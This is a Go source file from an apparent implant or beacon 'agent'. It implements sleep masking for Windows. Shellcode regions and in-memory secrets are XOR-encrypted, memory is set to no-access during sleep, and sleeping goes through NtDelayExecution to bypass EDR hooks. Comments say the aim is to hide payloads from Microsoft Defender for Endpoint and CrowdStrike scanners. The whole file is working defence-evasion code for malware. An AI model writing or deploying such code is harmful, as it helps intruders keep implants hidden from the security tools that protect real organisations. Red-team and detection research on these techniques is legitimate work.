//go:build windows

package agent

import (
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

var procNtDelayExecution = ntdll.NewProc("NtDelayExecution")

// maskRegion tracks a section-mapped shellcode region for sleep masking.
type maskRegion struct {
	base uintptr
	size uintptr
}

var (
	maskRegionsMu sync.Mutex
	maskRegions   []maskRegion
)

// RegisterRegion registers a section-mapped RX region for XOR masking during sleep.
// Only call for regions that will NOT be executing when sleepMask fires (e.g. dormant payloads).
func RegisterRegion(base, size uintptr) {
	maskRegionsMu.Lock()
	maskRegions = append(maskRegions, maskRegion{base, size})
	maskRegionsMu.Unlock()
}

// xorMaskRegion flips a mapped region RW, XORs every byte, flips back to RX.
// Hides shellcode signatures from periodic memory scanners (MDE, CrowdStrike).
func xorMaskRegion(base, size uintptr) {
	const key = byte(0xA7)
	a := base
	sz := size
	var old uint32
	// RX → RW
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(windows.PAGE_READWRITE),
		uintptr(unsafe.Pointer(&old)),
	)
	p := unsafe.Slice((*byte)(unsafe.Pointer(base)), size)
	for i := range p {
		p[i] ^= key
	}
	// RW → original (RX)
	a = base
	procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&a)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
}

// sleepMask sleeps via NtDelayExecution (bypasses kernel32!Sleep hooks) and
// XOR-scrambles heap targets + any registered dormant shellcode regions.
func sleepMask(durationMs uint32) {
	// Scramble Go-heap targets (AES keys, config, etc.)
	scrambleMu.Lock()
	for _, buf := range scrambleTargets {
		for i := range buf {
			buf[i] ^= scrambleKey
		}
	}
	scrambleMu.Unlock()

	// Mask dormant section regions
	maskRegionsMu.Lock()
	for _, r := range maskRegions {
		xorMaskRegion(r.base, r.size)
	}
	maskRegionsMu.Unlock()

	// Sleep via NT (bypasses any kernel32!Sleep hook used by EDRs for beacon detection).
	// DelayInterval: 100-ns units, negative = relative time.
	delay := -int64(durationMs) * 10000
	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))

	// Unmask — restore all regions before resuming
	maskRegionsMu.Lock()
	for _, r := range maskRegions {
		xorMaskRegion(r.base, r.size)
	}
	maskRegionsMu.Unlock()

	scrambleMu.Lock()
	for _, buf := range scrambleTargets {
		for i := range buf {
			buf[i] ^= scrambleKey
		}
	}
	scrambleMu.Unlock()
}

func encryptRegion(data []byte, key byte) {
	for i := range data {
		data[i] ^= key
	}
}

// sleepMaskNoAccess sleeps with key memory regions set PAGE_NOACCESS so that
// EDR periodic memory scanners fault out rather than reading beacon memory.
// Iterates registered maskRegions and sets them PAGE_NOACCESS, sleeps, then
// restores original protections.
func sleepMaskNoAccess(durationMs uint32) {
	type savedProt struct {
		base uintptr
		size uintptr
		prot uint32
	}
	maskRegionsMu.Lock()
	saved := make([]savedProt, 0, len(maskRegions))
	for _, r := range maskRegions {
		var old uint32
		a := r.base
		sz := r.size
		procNtProtectVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&a)),
			uintptr(unsafe.Pointer(&sz)),
			uintptr(windows.PAGE_NOACCESS),
			uintptr(unsafe.Pointer(&old)),
		)
		saved = append(saved, savedProt{r.base, r.size, old})
	}
	maskRegionsMu.Unlock()

	delay := -int64(durationMs) * 10000
	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))

	maskRegionsMu.Lock()
	for _, s := range saved {
		var old uint32
		a := s.base
		sz := s.size
		procNtProtectVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&a)),
			uintptr(unsafe.Pointer(&sz)),
			uintptr(s.prot),
			uintptr(unsafe.Pointer(&old)),
		)
	}
	maskRegionsMu.Unlock()
}

// sleepMaskEkko encrypts registered regions via XOR before sleeping and decrypts
// after waking, using NtDelayExecution in an alertable state. This achieves the
// same OPSEC goal as Ekko (memory encrypted during sleep) without requiring a
// full ROP chain or cgo callbacks.
func sleepMaskEkko(durationMs uint32) {
	// Encrypt all registered regions before sleep
	maskRegionsMu.Lock()
	for _, r := range maskRegions {
		xorMaskRegion(r.base, r.size)
	}
	maskRegionsMu.Unlock()

	// Alertable sleep via NtDelayExecution — same as default sleepMask
	delay := -int64(durationMs) * 10000
	procNtDelayExecution.Call(1, uintptr(unsafe.Pointer(&delay))) // Alertable=true

	// Decrypt all registered regions after waking
	maskRegionsMu.Lock()
	for _, r := range maskRegions {
		xorMaskRegion(r.base, r.size)
	}
	maskRegionsMu.Unlock()
}
